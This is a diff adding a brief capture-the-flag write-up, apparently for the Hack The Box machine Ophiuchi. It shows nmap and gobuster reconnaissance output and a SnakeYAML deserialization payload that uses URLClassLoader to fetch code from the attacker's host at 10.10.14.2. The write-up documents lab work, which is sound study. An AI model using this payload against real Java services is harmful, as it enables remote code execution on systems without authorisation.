@@ -1,0 +1,32 @@
+I start off with an nmpa scan:
+└─# nmap -sC -sV -A 10.10.10.227
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 6d:fc:68:e2:da:5e:80:df:bc:d0:45:f5:29:db:04:ee (RSA)
+|   256 7a:c9:83:7e:13:cb:c3:f9:59:1e:53:21:ab:19:76:ab (ECDSA)
+|_  256 17:6b:c3:a8:fc:5d:36:08:a1:40:89:d2:f4:0a:c6:46 (ED25519)
+8080/tcp open  http    Apache Tomcat 9.0.38
+|_http-title: Parse YAML
+Directory bruteforcing:
+└─# gobuster dir -u http://10.10.10.227:8080 -w /usr/share/wordlists/directory-list-2.3-medium.txt
+/test                 (Status: 302) 
+/manager              (Status: 302) 
+/http%3A%2F%2Fwww     (Status: 400)
+
+A good reference with Snakeyaml deserialization exploit here : https://swapneildash.medium.com/snakeyaml-deserilization-exploited-b4a2c5ac0858
+
+A sample yaml input as below:
+firstName: "John"
+lastName: "Kelly"
+age: 20
+
+The below line of code tries to fecth a file from my local server before errorring out:
+!!javax.script.ScriptEngineManager [
+  !!java.net.URLClassLoader [[
+    !!java.net.URL ["http://10.10.14.2/"]
+  ]]
+]
+Error message like : Due to security reason this feature has been temporarily on hold. We will soon fix the issue!
+
+Further reference here : https://fmash16.github.io/content/writeups/hackthebox/htb-Ophiuchi.html
